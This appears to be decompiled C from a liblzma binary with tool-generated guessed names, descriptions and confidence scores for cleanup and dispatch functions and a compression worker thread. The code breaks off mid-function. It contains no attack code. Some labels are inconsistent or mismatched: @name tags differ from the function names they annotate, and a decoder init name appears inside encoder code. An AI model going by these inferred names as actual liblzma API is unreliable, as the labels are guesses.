 * @name  lzma_next_coder_end
 * @brief Ends next coder if its function pointer at offset 0x10 is non-null
 * @confidence 85%
 * @classification cleanup
 * @address 0x00105300
 */

/* Conditionally calls cleanup on a next_coder structure */

void lzma_next_coder_end(long param_1)

{
  if (*(long *)(param_1 + 0x10) != 0) {
    lzma_next_coder_cleanup();
    return;
  }
  return;
}



/**
 * @name  lzma_end
 * @brief Main LZMA stream destructor: cleans up internal state and frees allocations
 * @confidence 95%
 * @classification cleanup
 * @address 0x001056e0
 */

/* Main LZMA stream destructor */

void lzma_end(long param_1)

{
  undefined8 uVar1;
  long lVar2;
  
  if (param_1 != 0) {
    lVar2 = *(long *)(param_1 + 0x38);
    if (lVar2 != 0) {
      uVar1 = *(undefined8 *)(param_1 + 0x30);
      if (*(long *)(lVar2 + 0x10) != 0) {
        lzma_next_coder_cleanup(lVar2,uVar1);
        uVar1 = *(undefined8 *)(param_1 + 0x30);
        lVar2 = *(long *)(param_1 + 0x38);
      }
      lzma_free(lVar2,uVar1);
      *(undefined8 *)(param_1 + 0x38) = 0;
    }
    return;
  }
  return;
}



/**
 * @name  lzma_filters_free
 * @brief Frees LZMA filter chain (up to 4 filters), clearing options and IDs
 * @confidence 90%
 * @classification cleanup
 * @address 0x00105d50
 */

/* Frees LZMA filter chain (up to 4 filters) */

void lzma_filters_free(long *param_1,undefined8 param_2)

{
  long lVar1;
  
  if (param_1 == (long *)0x0) {
    return;
  }
  if (*param_1 != -1) {
    lVar1 = 0;
    do {
      lVar1 = lVar1 + 1;
      lzma_free(param_1[1],param_2);
      param_1[1] = 0;
      *param_1 = -1;
      if (param_1[2] == -1) {
        return;
      }
      param_1 = param_1 + 2;
    } while (lVar1 != 4);
  }
  return;
}



/**
 * @name  lzma_index_stream_end
 * @brief Frees tree at stream+0x38 if non-null, then frees stream node
 * @confidence 80%
 * @classification cleanup
 * @address 0x001060d0
 */

/* Frees tree at node+0x38 then frees node itself */

void lzma_index_stream_end(long param_1,undefined8 param_2)

{
  if (*(long *)(param_1 + 0x38) != 0) {
    lzma_index_tree_free(*(long *)(param_1 + 0x38),param_2,lzma_free);
  }
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_index_end
 * @brief Destructor for LZMA index: recursively frees tree then deallocates index
 * @confidence 95%
 * @classification cleanup
 * @address 0x00106600
 */

/* Destructor for LZMA index; frees internal tree nodes and deallocates */

void lzma_index_end(long *param_1,undefined8 param_2)

{
  if (param_1 != (long *)0x0) {
    if (*param_1 != 0) {
      lzma_index_tree_free(*param_1,param_2,lzma_index_stream_end);
    }
    lzma_free(param_1,param_2);
    return;
  }
  return;
}



/**
 * @name  lzma_outq_clear
 * @brief Repeatedly pops items from output queue until empty
 * @confidence 80%
 * @classification cleanup
 * @address 0x00109a80
 */

/* Repeatedly dequeues and processes items until queue is empty */

void lzma_outq_clear(long param_1,undefined8 param_2)

{
  if (*(long *)(param_1 + 0x18) == 0) {
    return;
  }
  do {
    lzma_outq_pop(param_1,param_2);
  } while (*(long *)(param_1 + 0x18) != 0);
  return;
}



/**
 * @name  lzma_outq_drain_to_marker
 * @brief Drains output queue items until reaching a specific marker value
 * @confidence 75%
 * @classification cleanup
 * @address 0x00109ad0
 */

/* Drains output queue items until reaching marker */

void lzma_outq_drain_to_marker(long param_1,undefined8 param_2,long param_3)

{
  long *plVar1;
  long lVar2;
  
  plVar1 = *(long **)(param_1 + 0x18);
  if (plVar1 == (long *)0x0) {
    return;
  }
  lVar2 = *plVar1;
  while (lVar2 != 0) {
    lzma_outq_pop(param_1,param_2);
    plVar1 = *(long **)(param_1 + 0x18);
    lVar2 = *plVar1;
  }
  if (plVar1[2] != param_3) {
    lzma_outq_pop(param_1,param_2);
    return;
  }
  return;
}



/**
 * @name  lzma_outq_drain
 * @brief Fully drains output queue: removes active nodes then pops pending items
 * @confidence 80%
 * @classification cleanup
 * @address 0x00109ba0
 */

/* Drains output queue by removing active and pending items */

void lzma_outq_drain(long *param_1,undefined8 param_2)

{
  long lVar1;
  
  if (*param_1 == 0) goto LAB_00109beb;
  do {
    lzma_dec_remove_node(param_1,param_2);
  } while (*param_1 != 0);
  lVar1 = param_1[3];
  while (lVar1 != 0) {
    lzma_outq_pop(param_1,param_2);
LAB_00109beb:
    lVar1 = param_1[3];
  }
  return;
}



/**
 * @name  lzma_lz_decoder_end
 * @brief Cleans up LZ decoder by ending next coder then freeing the coder
 * @confidence 85%
 * @classification cleanup
 * @address 0x00109e60
 */

/* Calls check_and_handle_condition then free_with_destructor */

void lzma_lz_decoder_end(undefined8 param_1,undefined8 param_2)

{
  lzma_next_coder_end();
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_next_end_and_free_2
 * @brief Ends next coder then frees the coder allocation
 * @confidence 80%
 * @classification cleanup
 * @address 0x0010a800
 */

/* Calls check_and_handle_condition then free_with_destructor */

void lzma_next_end_and_free_5(undefined8 param_1,undefined8 param_2)

{
  lzma_next_coder_end();
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_stream_decoder_end_mt
 * @brief Full MT stream decoder cleanup: two next coders, index, filters, coder
 * @confidence 80%
 * @classification cleanup
 * @address 0x0010bf10
 */

/* Full stream decoder cleanup: filters, index, internal state */

void lzma_stream_decoder_end_full_2(long param_1,undefined8 param_2)

{
  lzma_next_coder_end(param_1 + 8);
  lzma_next_coder_end(param_1 + 0x178,param_2);
  lzma_index_end(*(undefined8 *)(param_1 + 0x1c8),param_2);
  lzma_filters_free(param_1 + 0x128,param_2);
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_mt_stop_and_free_workers
 * @brief Signals worker threads to state 4, joins all threads, frees worker array memory.
 * @confidence 78%
 * @classification cleanup
 * @address 0x0010d160
 */

void FUN_0010d160(long *param_1,uint *param_2,undefined8 param_3)

{
  long lVar1;
  long lVar2;
  ulong uVar3;
  uint uVar4;
  
  if (*param_2 != 0) {
    uVar3 = 0;
    do {
      uVar4 = (int)uVar3 + 1;
      lVar2 = uVar3 * 0x220;
      pthread_mutex_lock((pthread_mutex_t *)(*param_1 + lVar2 + 0x1b8));
      lVar1 = *param_1;
      *(undefined4 *)(lVar1 + lVar2) = 4;
      pthread_cond_signal((pthread_cond_t *)((undefined4 *)(lVar1 + lVar2) + 0x78));
      pthread_mutex_unlock((pthread_mutex_t *)(*param_1 + lVar2 + 0x1b8));
      uVar3 = (ulong)uVar4;
    } while (uVar4 < *param_2);
    if (*param_2 != 0) {
      uVar3 = 0;
      do {
        uVar4 = (int)uVar3 + 1;
        pthread_join(*(pthread_t *)(uVar3 * 0x220 + *param_1 + 0x218),(void **)0x0);
        uVar3 = (ulong)uVar4;
      } while (uVar4 < *param_2);
    }
  }
  lzma_free(*param_1,param_3);
  return;
}



/**
 * @name  lzma_stream_decoder_mt_end
 * @brief Full cleanup for MT stream decoder: stops threads, drains queues, frees filters/index/sync objects.
 * @confidence 80%
 * @classification cleanup
 * @address 0x0010d6b0
 */

/* Cleanup function for LZMA decoder state. Deallocates filters, indices, condition variables,
   mutexes, and other associated resources. */

void lzma_decoder_cleanup(long param_1,undefined8 param_2)

{
  FUN_0010d160(param_1 + 0x1a8,param_1 + 0x1b4,param_2);
  lzma_outq_drain(param_1 + 0x158,param_2);
  lzma_filters_free(param_1 + 0x10,param_2);
  lzma_filters_free(param_1 + 0x60,param_2);
  lzma_next_coder_end(param_1 + 0xb8,param_2);
  lzma_index_end(*(undefined8 *)(param_1 + 0xb0),param_2);
  pthread_cond_destroy((pthread_cond_t *)(param_1 + 0x200));
  pthread_mutex_destroy((pthread_mutex_t *)(param_1 + 0x1d8));
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_next_end_and_free
 * @brief Ends next coder then frees the coder allocation
 * @confidence 80%
 * @classification cleanup
 * @address 0x0010e5c0
 */

/* Calls check_and_handle_condition then free_with_destructor */

void lzma_next_end_and_free(undefined8 param_1,undefined8 param_2)

{
  lzma_next_coder_end();
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_next_end_and_free_3
 * @brief Ends next coder then frees the coder allocation
 * @confidence 80%
 * @classification cleanup
 * @address 0x0010e790
 */

/* Calls check_and_handle_condition then free_with_destructor */

void lzma_next_end_and_free_1(undefined8 param_1,undefined8 param_2)

{
  lzma_next_coder_end();
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_next_end_and_free_4
 * @brief Ends next coder then frees the coder allocation
 * @confidence 80%
 * @classification cleanup
 * @address 0x0010ec70
 */

/* Calls check_and_handle_condition then free_with_destructor */

void lzma_next_end_and_free_2(undefined8 param_1,undefined8 param_2)

{
  lzma_next_coder_end();
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_simple_coder_end
 * @brief Ends next coder at coder+8 then frees the coder
 * @confidence 85%
 * @classification cleanup
 * @address 0x0010f030
 */

/* Calls check_and_handle_condition on coder+8 then frees coder */

void lzma_simple_coder_end(long param_1,undefined8 param_2)

{
  lzma_next_coder_end(param_1 + 8);
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_file_info_decoder_end
 * @brief Cleans up file info decoder: next coder, two index objects, and coder struct
 * @confidence 80%
 * @classification cleanup
 * @address 0x0010fb90
 */

/* Cleans up file info decoder including two index objects */

void lzma_file_info_decoder_end(long param_1,undefined8 param_2)

{
  lzma_next_coder_end(param_1 + 0x20);
  lzma_index_end(*(undefined8 *)(param_1 + 0x78),param_2);
  lzma_index_end(*(undefined8 *)(param_1 + 0x88),param_2);
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_index_decoder_end
 * @brief Frees index object at coder+0x10 then frees coder
 * @confidence 85%
 * @classification cleanup
 * @address 0x00110860
 */

/* Frees index at coder+0x10 then frees coder */

void lzma_index_decoder_end(long param_1,undefined8 param_2)

{
  lzma_index_end(*(undefined8 *)(param_1 + 0x10));
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_stream_decoder_end_full
 * @brief Cleans up stream decoder including next coder, index hash, and coder allocation
 * @confidence 80%
 * @classification cleanup
 * @address 0x001116e0
 */

/* Cleans up stream decoder including hash and allocation tracking */

void lzma_stream_decoder_end_full(long param_1,undefined8 param_2)

{
  lzma_next_coder_end(param_1 + 8);
  lzma_index_hash_end(*(undefined8 *)(param_1 + 0x160),param_2);
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_mt_decoder_stop_workers
 * @brief Stops MT decoder worker threads: signals state 3, joins all threads, frees worker array, resets counters.
 * @confidence 78%
 * @classification cleanup
 * @address 0x00112580
 */

/* Stops and cleans up worker threads. Signals threads to stop (sets state to 3), joins all threads,
   and frees the thread pool memory. */

void stop_worker_threads(long param_1,undefined8 param_2)

{
  long lVar1;
  ulong uVar2;
  undefined4 *puVar3;
  uint uVar4;
  
  if (*(int *)(param_1 + 0x1c8) != 0) {
    uVar2 = 0;
    do {
      uVar4 = (int)uVar2 + 1;
      lVar1 = uVar2 * 0x1f8;
      pthread_mutex_lock((pthread_mutex_t *)(*(long *)(param_1 + 0x1d0) + lVar1 + 400));
      puVar3 = (undefined4 *)(*(long *)(param_1 + 0x1d0) + lVar1);
      *puVar3 = 3;
      pthread_cond_signal((pthread_cond_t *)(puVar3 + 0x6e));
      pthread_mutex_unlock((pthread_mutex_t *)(lVar1 + *(long *)(param_1 + 0x1d0) + 400));
      uVar2 = (ulong)uVar4;
    } while (uVar4 < *(uint *)(param_1 + 0x1c8));
    if (*(uint *)(param_1 + 0x1c8) != 0) {
      uVar2 = 0;
      do {
        uVar4 = (int)uVar2 + 1;
        pthread_join(*(pthread_t *)(*(long *)(param_1 + 0x1d0) + uVar2 * 0x1f8 + 0x1f0),(void **)0x0
                    );
        uVar2 = (ulong)uVar4;
      } while (uVar4 < *(uint *)(param_1 + 0x1c8));
    }
  }
  lzma_free(*(undefined8 *)(param_1 + 0x1d0),param_2);
  *(undefined4 *)(param_1 + 0x1c8) = 0;
  *(undefined8 *)(param_1 + 0x1d0) = 0;
  *(undefined8 *)(param_1 + 0x1d8) = 0;
  *(undefined8 *)(param_1 + 0x2a0) = 0;
  *(undefined8 *)(param_1 + 0x2a8) = 0;
  return;
}



/**
 * @name  lzma_next_end_and_free_5
 * @brief Ends next coder then frees the coder allocation
 * @confidence 80%
 * @classification cleanup
 * @address 0x00114150
 */

/* Calls check_and_handle_condition then free_with_destructor */

void lzma_next_end_and_free_3(undefined8 param_1,undefined8 param_2)

{
  lzma_next_coder_end();
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_lzip_decoder_end
 * @brief Ends next coder at coder+200 then frees the coder
 * @confidence 80%
 * @classification cleanup
 * @address 0x00114630
 */

/* Calls check_and_handle_condition on coder+200 then frees coder */

void lzma_lzip_decoder_end(long param_1,undefined8 param_2)

{
  lzma_next_coder_end(param_1 + 200);
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_lzma_encoder_end
 * @brief Frees LZMA encoder resources including sub-coders, buffers, and dictionary
 * @confidence 85%
 * @classification cleanup
 * @address 0x001165a0
 */

/* Frees encoder resources including sub-coders and buffers */

void lzma_lzma_encoder_end(undefined8 *param_1,undefined8 param_2)

{
  lzma_next_coder_end(param_1 + 0x14);
  lzma_free(param_1[0xe],param_2);
  lzma_free(param_1[0xd],param_2);
  lzma_free(param_1[5],param_2);
  if ((code *)param_1[2] == (code *)0x0) {
    lzma_free(*param_1,param_2);
  }
  else {
    (*(code *)param_1[2])();
  }
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_lzma_decoder_end
 * @brief Frees LZMA decoder: ends sub-coder, frees dictionary (via destructor or free), frees coder
 * @confidence 85%
 * @classification cleanup
 * @address 0x00118190
 */

/* Frees decoder resources including sub-coders and buffers */

void lzma_lzma_decoder_end(undefined8 *param_1,undefined8 param_2)

{
  lzma_next_coder_end(param_1 + 0xb);
  lzma_free(*param_1,param_2);
  if ((code *)param_1[10] == (code *)0x0) {
    lzma_free(param_1[6],param_2);
  }
  else {
    (*(code *)param_1[10])();
  }
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_stream_decoder_end
 * @brief Frees nested decoder at coder+8 then frees coder itself
 * @confidence 80%
 * @classification cleanup
 * @address 0x00120830
 */

/* Frees nested decoder at coder+8 then frees coder */

void lzma_stream_decoder_end(long param_1,undefined8 param_2)

{
  lzma_free(*(undefined8 *)(param_1 + 8));
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_alone_decoder_end
 * @brief Frees nested decoder at coder+8 then frees coder
 * @confidence 80%
 * @classification cleanup
 * @address 0x00120f00
 */

/* Frees nested decoder at coder+8 then frees coder itself */

void lzma_alone_decoder_end(long param_1,undefined8 param_2)

{
  lzma_free(*(undefined8 *)(param_1 + 8));
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_next_end_and_free_6
 * @brief Ends next coder then frees the coder allocation
 * @confidence 80%
 * @classification cleanup
 * @address 0x00121330
 */

/* Calls check_and_handle_condition then free_with_destructor */

void lzma_next_end_and_free_4(undefined8 param_1,undefined8 param_2)

{
  lzma_next_coder_end();
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  lzma_lz_encoder_end
 * @brief Frees LZ encoder sub-resources at coder+0x60 and the coder itself
 * @confidence 85%
 * @classification cleanup
 * @address 0x00121780
 */

/* Cleans up LZ encoder by freeing sub-resources at coder+0x60 and coder itself */

void lzma_lz_encoder_end(long param_1,undefined8 param_2)

{
  lzma_next_coder_end();
  lzma_free(*(undefined8 *)(param_1 + 0x60),param_2);
  lzma_free(param_1,param_2);
  return;
}



/* ==================== Handlers ==================== */

/**
 * @name  lzma_next_coder_code
 * @brief Validates action matches expected, dispatches to coder function pointer
 * @confidence 80%
 * @classification handler
 * @address 0x001052c0
 */

/* Validates action value and dispatches to coder function pointer */

undefined8 lzma_next_coder_code(undefined8 *param_1,undefined8 param_2,long *param_3)

{
  undefined8 uVar1;
  
  if (*param_3 != param_1[1]) {
    return 0xb;
  }
  if (*param_3 != -1) {
                    /* WARNING: Could not recover jumptable at 0x001052df. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    uVar1 = (*(code *)param_1[8])(*param_1,param_2,0,param_3);
    return uVar1;
  }
  return 0;
}



/**
 * @name  lzma_code
 * @brief Main LZMA codec dispatch function. Validates stream state, checks action validity, calls internal codec, updates stream positions/byte counts, manages state transitions based on return codes.
 * @confidence 97%
 * @classification handler
 * @address 0x001053c0
 */

/* Main LZMA codec dispatch function. Validates stream state, checks action validity against allowed
   actions table, calls the internal codec function, updates stream positions and byte counts, and
   manages codec state transitions based on return codes. */

ulong lzma_code(long *param_1,ulong param_2)

{
  long lVar1;
  undefined8 *puVar2;
  ulong uVar3;
  long lVar4;
  uint uVar5;
  long lVar6;
  long in_FS_OFFSET;
  long local_30;
  long local_28;
  long local_20;
  
  lVar4 = *param_1;
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  if (lVar4 == 0) {
    uVar3 = 0xb;
    if (param_1[1] != 0) goto LAB_001054a0;
    lVar1 = param_1[3];
  }
  else {
    lVar1 = param_1[3];
  }
  if ((lVar1 == 0) && (uVar3 = 0xb, param_1[4] != 0)) goto LAB_001054a0;
  puVar2 = (undefined8 *)param_1[7];
  if ((puVar2 == (undefined8 *)0x0) ||
     (((code *)puVar2[3] == (code *)0x0 || (uVar5 = (uint)param_2, 4 < uVar5)))) {
switchD_0010547e_default:
    uVar3 = 0xb;
    goto LAB_001054a0;
  }
  uVar3 = 0xb;
  if ((*(char *)((long)puVar2 + (param_2 & 0xffffffff) + 0x60) == '\0') ||
     (((((uVar3 = 8, param_1[8] != 0 || (param_1[9] != 0)) || (param_1[10] != 0)) ||
       ((param_1[0xb] != 0 || (param_1[0xd] != 0)))) ||
      ((param_1[0xe] != 0 || ((param_1[0xf] != 0 || (param_1[0x10] != 0)))))))) goto LAB_001054a0;
  switch(*(undefined4 *)(puVar2 + 10)) {
  case 0:
    lVar6 = param_1[1];
    if (uVar5 == 3) {
      *(undefined4 *)(puVar2 + 10) = 3;
    }
    else if (uVar5 == 4) {
      *(undefined4 *)(puVar2 + 10) = 4;
    }
    else if (uVar5 == 1) {
      *(undefined4 *)(puVar2 + 10) = 1;
    }
    else if (uVar5 == 2) {
      *(undefined4 *)(puVar2 + 10) = 2;
    }
    goto LAB_00105516;
  case 1:
    uVar3 = 0xb;
    if (uVar5 != 1) goto LAB_001054a0;
    break;
  case 2:
    uVar3 = 0xb;
    if (uVar5 != 2) goto LAB_001054a0;
    break;
  case 3:
    uVar3 = 0xb;
    if (uVar5 != 3) goto LAB_001054a0;
    break;
  case 4:
    uVar3 = 0xb;
    if (uVar5 != 4) goto LAB_001054a0;
    break;
  case 5:
    uVar3 = 1;
    goto LAB_001054a0;
  default:
    goto switchD_0010547e_default;
  }
  uVar3 = 0xb;
  lVar6 = param_1[1];
  if (puVar2[0xb] != lVar6) goto LAB_001054a0;
LAB_00105516:
  local_30 = 0;
  local_28 = 0;
  uVar3 = (*(code *)puVar2[3])
                    (*puVar2,param_1[6],lVar4,&local_30,lVar6,lVar1,&local_28,param_1[4],param_2);
  if (local_30 == 0) {
    lVar4 = param_1[1];
  }
  else {
    *param_1 = *param_1 + local_30;
    param_1[2] = param_1[2] + local_30;
    lVar4 = param_1[1] - local_30;
    param_1[1] = lVar4;
  }
  lVar1 = param_1[7];
  if (local_28 != 0) {
    param_1[3] = param_1[3] + local_28;
    param_1[4] = param_1[4] - local_28;
    param_1[5] = param_1[5] + local_28;
    *(long *)(lVar1 + 0x58) = lVar4;
    switch(uVar3 & 0xffffffff) {
    case 1:
switchD_00105598_caseD_1:
      if ((*(int *)(lVar1 + 0x50) - 1U < 2) || (*(int *)(lVar1 + 0x50) == 4)) {
        *(undefined4 *)(lVar1 + 0x50) = 0;
      }
      else {
        *(undefined4 *)(lVar1 + 0x50) = 5;
      }
    case 2:
    case 3:
    case 4:
    case 6:
switchD_00105598_caseD_2:
      *(undefined1 *)(lVar1 + 0x65) = 0;
      break;
    case 5:
    case 7:
    case 8:
    case 9:
    case 10:
    case 0xb:
switchD_00105598_caseD_5:
      *(undefined4 *)(lVar1 + 0x50) = 6;
      break;
    case 0xc:
switchD_00105598_caseD_c:
      *(undefined1 *)(lVar1 + 0x65) = 0;
      uVar3 = 0xc;
      if (*(int *)(lVar1 + 0x50) == 3) {
        *(undefined4 *)(lVar1 + 0x50) = 0;
      }
      break;
    default:
switchD_00105598_default:
      if ((int)uVar3 != 0x65) goto switchD_00105598_caseD_5;
    case 0:
switchD_00105598_caseD_0:
      *(undefined1 *)(lVar1 + 0x65) = 0;
      uVar3 = 0;
    }
LAB_001054a0:
    if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
      return uVar3;
    }
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  *(long *)(lVar1 + 0x58) = lVar4;
  switch(uVar3 & 0xffffffff) {
  case 0:
    if (local_30 == 0) {
      if (*(char *)(lVar1 + 0x65) == '\0') {
        *(undefined1 *)(lVar1 + 0x65) = 1;
      }
      else {
        uVar3 = 10;
      }
      goto LAB_001054a0;
    }
    break;
  case 1:
    goto switchD_00105598_caseD_1;
  case 2:
  case 3:
  case 4:
  case 6:
    goto switchD_00105598_caseD_2;
  case 5:
  case 7:
  case 8:
  case 9:
  case 10:
  case 0xb:
    goto switchD_00105598_caseD_5;
  case 0xc:
    goto switchD_00105598_caseD_c;
  default:
    goto switchD_00105598_default;
  }
  goto switchD_00105598_caseD_0;
}



/**
 * @name  lzma_outq_read_callback
 * @brief Executes callback on ready queue head item's function pointer, then clears it
 * @confidence 75%
 * @classification handler
 * @address 0x00109e20
 */

/* Executes callback if queue head is ready and has function pointer */

void lzma_outq_read_callback(long *param_1,code *param_2)

{
  long lVar1;
  
  lVar1 = *param_1;
  if ((lVar1 != 0) && (*(char *)(lVar1 + 0x28) == '\0')) {
    if (*(long *)(lVar1 + 8) != 0) {
      (*param_2)();
      *(undefined8 *)(*param_1 + 8) = 0;
    }
    return;
  }
  return;
}



/**
 * @name  lzma_lz_decoder_code
 * @brief LZ decoder wrapper: buffers initial 13 bytes for LZMA header, then delegates to the inner decoder function pointer.
 * @confidence 75%
 * @classification handler
 * @address 0x0010a020
 */

/* Initializes LZMA decoder state if needed by buffering initial bytes, then processes data via
   function pointer in param_1[3] */

undefined8
lzma_decode_initialize_and_process
          (undefined8 *param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
          undefined8 param_5,undefined8 param_6,ulong *param_7,ulong param_8)

{
  undefined8 uVar1;
  
  if (param_8 <= *param_7) {
    return 0;
  }
  if (*(int *)(param_1 + 10) == 0) {
    lzma_bufcpy(param_1 + 0xc,param_1 + 0xb,0xd,param_6);
    if ((ulong)param_1[0xb] < 0xd) {
      return 0;
    }
    *(undefined4 *)(param_1 + 10) = 1;
    if (param_8 <= *param_7) {
      return 0;
    }
  }
  else if (*(int *)(param_1 + 10) != 1) {
    return 0xb;
  }
                    /* WARNING: Could not recover jumptable at 0x0010a0dc. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar1 = (*(code *)param_1[3])(*param_1,param_2,param_3,param_4,param_5,param_6);
  return uVar1;
}



/**
 * @name  lzma_block_encoder_update
 * @brief Block encoder filter update: returns error if finished flag set, otherwise delegates
 * @confidence 70%
 * @classification handler
 * @address 0x0010a7e0
 */

/* Checks flag at coder+0x58, conditionally calls handler */

undefined8
lzma_block_encoder_update(long param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  undefined8 uVar1;
  
  if (*(int *)(param_1 + 0x58) == 0) {
    uVar1 = lzma_next_coder_code(param_1,param_2,param_4);
    return uVar1;
  }
  return 0xb;
}



/**
 * @name  lzma_mt_signal_decoder_event
 * @brief Thread-safe event signaling: sets event if none pending, signals condition variable
 * @confidence 75%
 * @classification handler
 * @address 0x0010ca70
 */

/* Thread-safe event signaling with mutex protection */

void lzma_mt_signal_decoder_event(long *param_1,undefined4 param_2)

{
  long lVar1;
  
  pthread_mutex_lock((pthread_mutex_t *)(*param_1 + 0x1d8));
  lVar1 = *param_1;
  if (*(int *)(lVar1 + 0x1a4) == 0) {
    *(undefined4 *)(lVar1 + 0x1a4) = param_2;
  }
  pthread_cond_signal((pthread_cond_t *)(lVar1 + 0x200));
  pthread_mutex_unlock((pthread_mutex_t *)(*param_1 + 0x1d8));
  return;
}



/**
 * @name  lzma_worker_thread
 * @brief Worker thread for multi-threaded LZMA compression. Waits for work via condvars, compresses blocks with block encoder, falls back to uncompressed if larger, writes headers, signals completion to coordinator.
 * @confidence 90%
 * @classification handler
 * @address 0x0010cac0
 */

/* Worker thread function for multi-threaded LZMA compression. Waits for work via condition
   variables, compresses blocks using block encoder, falls back to uncompressed encoding if
   compressed output is larger, writes block headers, signals completion to thread pool coordinator.
    */

undefined8 lzma_worker_thread(uint *param_1)

{
  pthread_cond_t *__cond;
  pthread_mutex_t *__mutex;
  uint *puVar1;
  undefined8 uVar2;
  ulong uVar3;
  char cVar4;
  int iVar5;
  undefined8 uVar6;
  long lVar7;
  long lVar8;
  uint *puVar9;
  uint uVar10;
  long in_FS_OFFSET;
  byte bVar11;
  ulong local_50;
  long local_48;
  long local_40;
  
  bVar11 = 0;
  __cond = (pthread_cond_t *)(param_1 + 0x78);
  __mutex = (pthread_mutex_t *)(param_1 + 0x6e);
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  puVar1 = param_1 + 0x24;
  do {
    pthread_mutex_lock(__mutex);
    while( true ) {
      uVar10 = *param_1;
      if (uVar10 == 3) {
        *param_1 = 0;
        pthread_cond_signal(__cond);
        uVar10 = *param_1;
      }
      if (uVar10 != 0) break;
      pthread_cond_wait(__cond,__mutex);
    }
    pthread_mutex_unlock(__mutex);
    local_50 = 0;
    if (uVar10 < 3) {
      uVar10 = *(uint *)(*(long *)(param_1 + 8) + 0x118);
      uVar6 = *(undefined8 *)(*(long *)(param_1 + 8) + 8);
      uVar2 = *(undefined8 *)(*(long *)(param_1 + 6) + 0x10);
      puVar9 = param_1 + 0x24;
      for (lVar7 = 0x1a; lVar7 != 0; lVar7 = lVar7 - 1) {
        puVar9[0] = 0;
        puVar9[1] = 0;
        puVar9 = puVar9 + (ulong)bVar11 * -4 + 2;
      }
      param_1[0x26] = uVar10;
      *(undefined8 *)(param_1 + 0x28) = uVar2;
      *(undefined8 *)(param_1 + 0x2a) = uVar6;
      *(uint **)(param_1 + 0x2c) = param_1 + 0x58;
      iVar5 = lzma_block_header_size(puVar1);
      if ((iVar5 != 0) ||
         (iVar5 = lzma_alone_decoder_init(param_1 + 0x10,*(undefined8 *)(param_1 + 10),puVar1),
         iVar5 != 0)) {
LAB_0010ce40:
        lzma_mt_signal_decoder_event(param_1 + 8,iVar5);
        goto LAB_0010cb95;
      }
      local_50 = (ulong)param_1[0x25];
      local_48 = 0;
      uVar3 = *(ulong *)(*(long *)(param_1 + 6) + 0x10);
      lVar7 = 0;
      do {
        pthread_mutex_lock(__mutex);
        lVar8 = *(long *)(param_1 + 4);
        *(long *)(param_1 + 0xc) = local_48;
        *(ulong *)(param_1 + 0xe) = local_50;
        if (lVar7 == lVar8) {
          do {
            uVar10 = *param_1;
            if (uVar10 != 1) goto LAB_0010cd24;
            pthread_cond_wait(__cond,__mutex);
          } while (*(long *)(param_1 + 4) == lVar7);
          uVar10 = *param_1;
          lVar8 = *(long *)(param_1 + 4);
        }
        else {
          uVar10 = *param_1;
        }
LAB_0010cd24:
        pthread_mutex_unlock(__mutex);
        if (2 < uVar10) goto LAB_0010cb8b;
        cVar4 = (uVar10 == 2) * '\x03';
        lVar7 = lVar8;
        if (0x4000 < (ulong)(lVar8 - local_48)) {
          lVar7 = local_48 + 0x4000;
          cVar4 = '\0';
        }
        iVar5 = (**(code **)(param_1 + 0x16))
                          (*(undefined8 *)(param_1 + 0x10),*(undefined8 *)(param_1 + 10),
                           *(undefined8 *)(param_1 + 2),&local_48,lVar7,
                           *(long *)(param_1 + 6) + 0x40,&local_50,uVar3,cVar4);
        if (iVar5 != 0) {
          if ((iVar5 != 1) ||
             (iVar5 = lzma_block_header_encode(puVar1,*(long *)(param_1 + 6) + 0x40), iVar5 != 0))
          goto LAB_0010ce40;
          goto LAB_0010ced3;
        }
        lVar7 = lVar8;
      } while (local_50 < uVar3);
      pthread_mutex_lock(__mutex);
      uVar10 = *param_1;
      while (uVar10 == 1) {
        pthread_cond_wait(__cond,__mutex);
        uVar10 = *param_1;
      }
      uVar6 = *(undefined8 *)(param_1 + 4);
      pthread_mutex_unlock(__mutex);
      if (2 < uVar10) goto LAB_0010cb8b;
      local_50 = 0;
      iVar5 = lzma_block_uncomp_encode
                        (puVar1,*(undefined8 *)(param_1 + 2),uVar6,*(long *)(param_1 + 6) + 0x40,
                         &local_50,uVar3);
      if (iVar5 != 0) {
        lzma_mt_signal_decoder_event(param_1 + 8,0xb);
        goto LAB_0010cb95;
      }
LAB_0010ced3:
      lVar7 = *(long *)(param_1 + 6);
      uVar6 = lzma_block_unpadded_size(puVar1);
      *(undefined8 *)(lVar7 + 0x30) = uVar6;
      *(undefined8 *)(lVar7 + 0x38) = *(undefined8 *)(param_1 + 0x2a);
      pthread_mutex_lock(__mutex);
      if (*param_1 != 4) {
        *param_1 = 0;
        pthread_cond_signal(__cond);
      }
      pthread_mutex_unlock(__mutex);
      pthread_mutex_lock((pthread_mutex_t *)(*(long *)(param_1 + 8) + 0x1d8));
      lVar7 = *(long *)(param_1 + 6);
      *(undefined1 *)(lVar7 + 0x28) = 1;
      *(ulong *)(lVar7 + 0x18) = local_50;
    }
    else {
LAB_0010cb8b:
      if (uVar10 == 4) {
